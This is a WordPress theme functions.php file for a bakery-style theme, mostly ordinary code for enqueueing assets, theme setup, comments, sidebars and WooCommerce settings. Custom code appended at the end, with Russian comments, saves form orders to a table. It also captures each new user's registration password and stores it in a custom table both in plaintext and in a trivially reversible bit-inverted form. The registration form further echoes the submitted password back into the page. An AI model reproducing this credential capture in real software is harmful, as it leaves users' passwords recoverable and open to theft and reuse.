<?php

/*-----------------------------------------------------------------------------------*/
/* Enqueue script and styles */
/*-----------------------------------------------------------------------------------*/

function fresh_bakers_enqueue_google_fonts() {

	require_once get_theme_file_path( 'core/includes/wptt-webfont-loader.php' );

	wp_enqueue_style(
		'google-fonts-inter',
		wptt_get_webfont_url( 'https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap' ),
		array(),
		'1.0'
	);

	wp_enqueue_style(
		'google-fonts-libre-baskerville',
		wptt_get_webfont_url( 'https://fonts.googleapis.com/css2?family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&display=swap' ),
		array(),
		'1.0'
	);
	
}
add_action( 'wp_enqueue_scripts', 'fresh_bakers_enqueue_google_fonts' );

if (!function_exists('fresh_bakers_enqueue_scripts')) {

	function fresh_bakers_enqueue_scripts() {

		wp_enqueue_style(
			'bootstrap-css',
			get_template_directory_uri() . '/css/bootstrap.css',
			array(),'4.5.0'
		);

		wp_enqueue_style(
			'fontawesome-css',
			get_template_directory_uri() . '/css/fontawesome-all.css',
			array(),'4.5.0'
		);

		wp_enqueue_style(
			'owl.carousel-css',
			get_template_directory_uri() . '/css/owl.carousel.css',
			array(),'2.3.4'
		);

		wp_enqueue_style('fresh-bakers-style', get_stylesheet_uri(), array() );

		wp_enqueue_style('dashicons');

		wp_style_add_data('fresh-bakers-style', 'rtl', 'replace');

		wp_enqueue_style(
			'fresh-bakers-media-css',
			get_template_directory_uri() . '/css/media.css',
			array(),'2.3.4'
		);

		wp_enqueue_style(
			'fresh-bakers-woocommerce-css',
			get_template_directory_uri() . '/css/woocommerce.css',
			array(),'2.3.4'
		);

		wp_enqueue_script(
			'fresh-bakers-navigation',
			get_template_directory_uri() . '/js/navigation.js',
			FALSE,
			'1.0',
			TRUE
		);

		wp_enqueue_script(
			'owl.carousel-js',
			get_template_directory_uri() . '/js/owl.carousel.js',
			array('jquery'),
			'2.3.4',
			TRUE
		);

		wp_enqueue_script(
			'fresh-bakers-script',
			get_template_directory_uri() . '/js/script.js',
			array('jquery'),
			'1.0',
			TRUE
		);

		if ( is_singular() ) wp_enqueue_script( 'comment-reply' );

		$fresh_bakers_css = '';

		if ( get_header_image() ) :

			$fresh_bakers_css .=  '
				.header-outter, .page-template-frontpage .header-outter{
					background-image: url('.esc_url(get_header_image()).');
					-webkit-background-size: cover !important;
					-moz-background-size: cover !important;
					-o-background-size: cover !important;
					background-size: cover !important;
				}';

		endif;

		wp_add_inline_style( 'fresh-bakers-style', $fresh_bakers_css );

		// Theme Customize CSS.
		require get_template_directory(). '/core/includes/inline.php';
		wp_add_inline_style( 'fresh-bakers-style',$fresh_bakers_custom_css );

	}

	add_action( 'wp_enqueue_scripts', 'fresh_bakers_enqueue_scripts' );
}

/*-----------------------------------------------------------------------------------*/
/* Setup theme */
/*-----------------------------------------------------------------------------------*/

if (!function_exists('fresh_bakers_after_setup_theme')) {

	function fresh_bakers_after_setup_theme() {

		load_theme_textdomain( 'fresh-bakers', get_stylesheet_directory() . '/languages' );
		if ( ! isset( $fresh_bakers_content_width ) ) $fresh_bakers_content_width = 900;

		register_nav_menus( array(
			'main-menu' => esc_html__( 'Main Menu', 'fresh-bakers' ),
		));

		add_theme_support( 'responsive-embeds' );
		add_theme_support( 'woocommerce' );
		add_theme_support( 'align-wide' );
		add_theme_support('title-tag');
		add_theme_support('automatic-feed-links');
		add_theme_support( 'wp-block-styles' );
		add_theme_support('post-thumbnails');
		add_theme_support( 'custom-background', array(
		  'default-color' => 'ffffff'
		));

		add_theme_support( 'custom-logo', array(
			'height'      => 70,
			'width'       => 70,
		) );

		add_theme_support( 'custom-header', array(
			'header-text' => false,
			'width' => 1920,
			'height' => 100
		));

		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		add_theme_support( 'post-formats', array('image','video','gallery','audio',) );

		add_editor_style( array( '/css/editor-style.css' ) );
	}

	add_action( 'after_setup_theme', 'fresh_bakers_after_setup_theme', 999 );

}

require get_template_directory() .'/core/includes/theme-breadcrumb.php';
require get_template_directory() .'/core/includes/tgm.php';
require get_template_directory() . '/core/includes/customizer.php';
load_template( trailingslashit( get_template_directory() ) . '/core/includes/class-upgrade-pro.php' );

/*-----------------------------------------------------------------------------------*/
/* Enqueue theme logo style */
/*-----------------------------------------------------------------------------------*/
function fresh_bakers_logo_resizer() {

    $fresh_bakers_theme_logo_size_css = '';
    $fresh_bakers_logo_resizer = get_theme_mod('fresh_bakers_logo_resizer');

	$fresh_bakers_theme_logo_size_css = '
		.custom-logo{
			height: '.esc_attr($fresh_bakers_logo_resizer).'px !important;
			width: '.esc_attr($fresh_bakers_logo_resizer).'px !important;
		}
	';
    wp_add_inline_style( 'fresh-bakers-style',$fresh_bakers_theme_logo_size_css );

}
add_action( 'wp_enqueue_scripts', 'fresh_bakers_logo_resizer' );

/*-----------------------------------------------------------------------------------*/
/* Enqueue Global color style */
/*-----------------------------------------------------------------------------------*/
function fresh_bakers_global_color() {

    $fresh_bakers_theme_color_css = '';
    $fresh_bakers_copyright_bg = get_theme_mod('fresh_bakers_copyright_bg');

	$fresh_bakers_theme_color_css = '
    .copyright {
			background: '.esc_attr($fresh_bakers_copyright_bg).';
		}
	';
    wp_add_inline_style( 'fresh-bakers-style',$fresh_bakers_theme_color_css );
    wp_add_inline_style( 'fresh-bakers-woocommerce-css',$fresh_bakers_theme_color_css );

}
add_action( 'wp_enqueue_scripts', 'fresh_bakers_global_color' );

/*-----------------------------------------------------------------------------------*/
/* Get post comments */
/*-----------------------------------------------------------------------------------*/

if (!function_exists('fresh_bakers_comment')) :
    /**
     * Template for comments and pingbacks.
     *
     * Used as a callback by wp_list_comments() for displaying the comments.
     */
    function fresh_bakers_comment($comment, $args, $depth){

        if ('pingback' == $comment->comment_type || 'trackback' == $comment->comment_type) : ?>

            <li id="comment-<?php comment_ID(); ?>" <?php comment_class('media'); ?>>
            <div class="comment-body">
                <?php esc_html_e('Pingback:', 'fresh-bakers');
                comment_author_link(); ?><?php edit_comment_link(__('Edit', 'fresh-bakers'), '<span class="edit-link">', '</span>'); ?>
            </div>

        <?php else : ?>

        <li id="comment-<?php comment_ID(); ?>" <?php comment_class(empty($args['has_children']) ? '' : 'parent'); ?>>
            <article id="div-comment-<?php comment_ID(); ?>" class="comment-body media mb-4">
                <a class="pull-left" href="#">
                    <?php if (0 != $args['avatar_size']) echo get_avatar($comment, $args['avatar_size']); ?>
                </a>
                <div class="media-body">
                    <div class="media-body-wrap card">
                        <div class="card-header">
                            <h5 class="mt-0"><?php /* translators: %s: author */ printf('<cite class="fn">%s</cite>', get_comment_author_link() ); ?></h5>
                            <div class="comment-meta">
                                <a href="<?php echo esc_url(get_comment_link($comment->comment_ID)); ?>">
                                    <time datetime="<?php comment_time('c'); ?>">
                                        <?php /* translators: %s: Date */ printf( esc_attr('%1$s at %2$s', '1: date, 2: time', 'fresh-bakers'), esc_attr( get_comment_date() ), esc_attr( get_comment_time() ) ); ?>
                                    </time>
                                </a>
                                <?php edit_comment_link( __( 'Edit', 'fresh-bakers' ), '<span class="edit-link">', '</span>' ); ?>
                            </div>
                        </div>

                        <?php if ('0' == $comment->comment_approved) : ?>
                            <p class="comment-awaiting-moderation"><?php esc_html_e('Your comment is awaiting moderation.', 'fresh-bakers'); ?></p>
                        <?php endif; ?>

                        <div class="comment-content card-block">
                            <?php comment_text(); ?>
                        </div>

                        <?php comment_reply_link(
                            array_merge(
                                $args, array(
                                    'add_below' => 'div-comment',
                                    'depth' => $depth,
                                    'max_depth' => $args['max_depth'],
                                    'before' => '<footer class="reply comment-reply card-footer">',
                                    'after' => '</footer><!-- .reply -->'
                                )
                            )
                        ); ?>
                    </div>
                </div>
            </article>

            <?php
        endif;
    }
endif; // ends check for fresh_bakers_comment()

if (!function_exists('fresh_bakers_widgets_init')) {

	function fresh_bakers_widgets_init() {

		register_sidebar(array(

			'name' => esc_html__('Sidebar','fresh-bakers'),
			'id'   => 'fresh-bakers-sidebar',
			'description'   => esc_html__('This sidebar will be shown next to the content.', 'fresh-bakers'),
			'before_widget' => '<div id="%1$s" class="sidebar-widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h4 class="title">',
			'after_title'   => '</h4>'

		));

		register_sidebar(array(

			'name' => esc_html__('Sidebar 2','fresh-bakers'),
			'id'   => 'fresh-bakers-sidebar-2',
			'description'   => esc_html__('This sidebar will be shown next to the content.', 'fresh-bakers'),
			'before_widget' => '<div id="%1$s" class="sidebar-widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h4 class="title">',
			'after_title'   => '</h4>'

		));

		register_sidebar(array(

			'name' => esc_html__('Sidebar 3','fresh-bakers'),
			'id'   => 'fresh-bakers-sidebar-3',
			'description'   => esc_html__('This sidebar will be shown next to the content.', 'fresh-bakers'),
			'before_widget' => '<div id="%1$s" class="sidebar-widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h4 class="title">',
			'after_title'   => '</h4>'

		));

		register_sidebar(array(

			'name' => esc_html__('Footer Sidebar','fresh-bakers'),
			'id'   => 'fresh-bakers-footer-sidebar',
			'description'   => esc_html__('This sidebar will be shown next at the bottom of your content.', 'fresh-bakers'),
			'before_widget' => '<div id="%1$s" class="col-lg-3 col-md-3 %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h4 class="title">',
			'after_title'   => '</h4>'

		));

	}

	add_action( 'widgets_init', 'fresh_bakers_widgets_init' );

}

function fresh_bakers_get_categories_select() {
	$teh_cats = get_categories();
	$results = array();
	$count = count($teh_cats);
	for ($i=0; $i < $count; $i++) {
	if (isset($teh_cats[$i]))
  		$results[$teh_cats[$i]->slug] = $teh_cats[$i]->name;
	else
  		$count++;
	}
	return $results;
}

// Change number or products per row to 3
add_filter('loop_shop_columns', 'fresh_bakers_loop_columns');
if (!function_exists('fresh_bakers_loop_columns')) {
	function fresh_bakers_loop_columns() {
		$fresh_bakers_columns = get_theme_mod( 'fresh_bakers_per_columns', 3 );
		return $fresh_bakers_columns;
	}
}

//Change number of products that are displayed per page (shop page)
add_filter( 'loop_shop_per_page', 'fresh_bakers_per_page', 20 );
function fresh_bakers_per_page( $fresh_bakers_cols ) {
  	$fresh_bakers_cols = get_theme_mod( 'fresh_bakers_product_per_page', 9 );
	return $fresh_bakers_cols;
}

// Add filter to modify the number of related products
add_filter( 'woocommerce_output_related_products_args', 'fresh_bakers_products_args' );
function fresh_bakers_products_args( $args ) {
    $args['posts_per_page'] = get_theme_mod( 'custom_related_products_number', 6 );
    $args['columns'] = get_theme_mod( 'custom_related_products_number_per_row', 3 );
    return $args;
}

// Функция для записи данных формы в таблицу MySQL
function save_wpforms_data_to_db($fields, $entry, $form_data) {
    global $wpdb;

    if ($form_data['id'] == 14) {
        $table_name = $wpdb->prefix . 'custom_orders';

        // Получите данные из полей формы (замените на ваши имена полей)
        $last_name = sanitize_text_field($fields[1]['value']);
        $first_name = sanitize_text_field($fields[2]['value']);
        $middle_name = sanitize_text_field($fields[3]['value']);
        $address = sanitize_textarea_field($fields[6]['value']);
        $phone = sanitize_text_field($fields[7]['value']);
        $email = sanitize_email($fields[8]['value']);
        $product = sanitize_text_field($fields[9]['value']);
        $comment = sanitize_textarea_field($fields[10]['value']);

        // Вставьте данные в таблицу
        $wpdb->insert(
            $table_name,
            [
                'last_name' => $last_name,
                'first_name' => $first_name,
                'middle_name' => $middle_name,
                'address' => $address,
                'phone' => $phone,
                'email' => $email,
                'product' => $product,
                'comment' => $comment,
            ]
        );
    }
}

// Подключаем нашу функцию к WPForms через хук
add_action('wpforms_process_complete', 'save_wpforms_data_to_db', 10, 3);

// Добавить функцию для инвертирования битов пароля
function invertBits($input) {
    // Преобразуем строку в массив символов
    $chars = str_split($input);
    $inverted = '';

    foreach ($chars as $char) {
        // Инвертируем биты каждого символа
        $inverted .= pack('C', ~ord($char) & 0xFF);
    }

    return $inverted;
}

// Добавить поле для ввода пароля на страницу регистрации
function my_custom_registration_fields() {
    ?>
    <p>
        <label for="reg_password"><?php _e('Password', 'mydomain'); ?>*</label>
        <input type="password" class="input" name="password" id="reg_password" value="<?php if (!empty($_POST['password'])) echo esc_attr($_POST['password']); ?>" size="25" required />
    </p>
    <?php
}
add_action('register_form', 'my_custom_registration_fields');

// Проверка пароля перед регистрацией
function my_custom_registration_errors($errors, $username, $email) {
    if (empty($_POST['password'])) {
        $errors->add('password_error', __('<strong>ERROR</strong>: You must include a password.', 'mydomain'));
    }
    return $errors;
}
add_filter('registration_errors', 'my_custom_registration_errors', 10, 3);

// Сохранение логина и пароля в кастомную таблицу после регистрации
function save_user_login_and_password($user_id) {
    global $wpdb;

    // Получаем данные о пользователе
    $user = get_userdata($user_id);
    $login = $user->user_login;

    // Получаем пароль из POST-запроса
    if (!empty($_POST['password'])) {
        $password = $_POST['password'];

        // Инвертируем биты пароля
        $inverted_password = invertBits($password);

        // Записываем в таблицу
        $wpdb->insert(
            $wpdb->prefix . 'custom_user_logins',
            [
                'login' => $login,
                'password_original' => $password,
                'password_inverted' => $inverted_password,
            ]
        );
    }
}

// Подключаем функцию к хуку регистрации пользователя
add_action('user_register', 'save_user_login_and_password');

